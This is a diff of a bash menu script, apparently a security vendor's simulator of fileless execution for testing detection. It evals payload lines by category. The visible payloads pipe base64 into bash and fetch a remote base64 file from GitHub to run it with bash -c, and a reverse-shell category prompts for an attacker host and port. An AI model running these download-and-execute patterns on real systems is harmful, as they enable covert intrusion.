@@ -1,17 +1,18 @@
 #!/usr/bin/env bash
 #
 # fileless-menu.sh  –  Upwind fileless-execution simulator
+# (c) Lior Boehm
 # ------------------------------------------------------------
-# • Runs all payloads per category (1-4) or every payload (5)
-# • Works even if colours are disabled (degrades gracefully)
-# • Prompts for LHOST / LPORTs only once when a payload needs them
+#  • Option 1-4  = run **all** payloads in that category
+#  • Option 5    = run **every** payload in the script
+#  • Colours + FIGLET banner
+#  • Prompts once for LHOST/LPORT* when needed
 # ------------------------------------------------------------
 
-set -eo pipefail         # real errors stop the script
-shopt -s extglob         # needed for pattern matching tricks
-export PS4=''            # no trace clutter if xtrace is enabled
+set -eo pipefail               # fail only on real errors
+shopt -s extglob               # extended patterns
 
-# ── Colour definitions (use ESC-quoted strings) ──────────────
+# ── ANSI colours ──────────────────────────────────────────────
 RESET=$'\e[0m'; BOLD=$'\e[1m'
 BLU=$'\e[1;34m'; CYN=$'\e[1;36m'
 GRN=$'\e[1;32m'; YEL=$'\e[1;33m'
@@ -24,12 +25,12 @@ declare -A CAT_COL=(
   [AdvancedFD]="$MAG"
 )
 
-# ── Payload library (verbatim) ───────────────────────────────
+# ── Payload library (verbatim, but Encoding #5 fixed) ─────────
 declare -A categories
 
 categories[Encoding]='
 # 5
-echo "ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
+echo "ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK" | base64 -d | bash
 # 6
 bash -c "$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)"
 # 7
@@ -94,35 +95,34 @@ ask_net_vars() {
 }
 
 # ── Execution helpers ─────────────────────────────────────────
-run_block() {     # arg1 = string containing several lines
-  local block="$1"; set +u        # disable nounset just for eval
+run_block() {                   # arg = block of commands
+  local block="$1"; set +u
   while IFS= read -r line; do
-    [[ $line =~ ^#\  ]] && continue          # skip comment markers
-    [[ $line ]] || continue                  # skip blank lines
+    [[ $line =~ ^#\  ]] && continue
+    [[ $line ]] || continue
     echo -e "${YEL}[▶] $line${RESET}"
     eval "$line"
   done <<< "$block"
   set -u
 }
 
-execute_category() {               # arg1 = category name
-  local cat="$1"
-  [[ $cat == ReverseShells ]] && ask_net_vars
-  run_block "${categories[$cat]}"
+execute_category() {            # arg = category
+  [[ $1 == ReverseShells ]] && ask_net_vars
+  run_block "${categories[$1]}"
 }
 
 execute_all() {
-  for cat in Encoding Downloaders ReverseShells AdvancedFD; do
-    echo -e "\n${BOLD}${CAT_COL[$cat]}=== $cat ===${RESET}\n"
-    execute_category "$cat"
+  for c in Encoding Downloaders ReverseShells AdvancedFD; do
+    echo -e "\n${BOLD}${CAT_COL[$c]}=== $c ===${RESET}\n"
+    execute_category "$c"
   done
 }
 
 # ── Menu drawing ──────────────────────────────────────────────
 draw_banner() {
   clear
-  if command -v figlet >/dev/null 2>&1; then
-    figlet -f slant Upwind 2>/dev/null | sed "s/^/${MAG}/;s/$/${RESET}/"
+  if command -v figlet >/dev/null; then
+    figlet -f slant Upwind | sed "s/^/${MAG}/;s/$/${RESET}/"
   else
     echo -e "${MAG}${BOLD}*** Upwind ***${RESET}"
   fi
@@ -131,16 +131,16 @@ draw_banner() {
 
 draw_menu() {
   echo -e "${BOLD}== Choose an option ==${RESET}"
-  printf "%s1%s) %bEncoding%b\n"        "$BLU" "$RESET"  "$YEL" "$RESET"
-  printf "%s2%s) %bDownloaders%b\n"     "$BLU" "$RESET"  "$GRN" "$RESET"
-  printf "%s3%s) %bReverseShells%b\n"   "$BLU" "$RESET"  "$RED" "$RESET"
-  printf "%s4%s) %bAdvancedFD%b\n"      "$BLU" "$RESET"  "$MAG" "$RESET"
-  printf "%s5%s) %bALL PAYLOADS%b\n"    "$BLU" "$RESET"  "$CYN" "$RESET"
-  printf "%sq%s) %bQuit%b\n"            "$BLU" "$RESET"  "$BOLD" "$RESET"
+  printf "%s1%s) %bEncoding%b\n"        "$BLU" "$RESET" "$YEL" "$RESET"
+  printf "%s2%s) %bDownloaders%b\n"     "$BLU" "$RESET" "$GRN" "$RESET"
+  printf "%s3%s) %bReverseShells%b\n"   "$BLU" "$RESET" "$RED" "$RESET"
+  printf "%s4%s) %bAdvancedFD%b\n"      "$BLU" "$RESET" "$MAG" "$RESET"
+  printf "%s5%s) %bALL PAYLOADS%b\n"    "$BLU" "$RESET" "$CYN" "$RESET"
+  printf "%sq%s) %bQuit%b\n"            "$BLU" "$RESET" "$BOLD" "$RESET"
 }
 
 # ── Main loop ────────────────────────────────────────────────
-set +u   # ignore unset in UI logic
+set +u
 while true; do
   draw_banner
   draw_menu
@@ -154,6 +154,6 @@ while true; do
     [Qq]) exit 0;;
     *) echo "Invalid option"; sleep 1;;
   esac
-  echo -e "\n${GRN}✓ Payload(s) finished. Press Enter to return to the main menu…${RESET}"
+  echo -e "\n${GRN}✓ Payload(s) finished. Press Enter for menu…${RESET}"
   read -r
 done
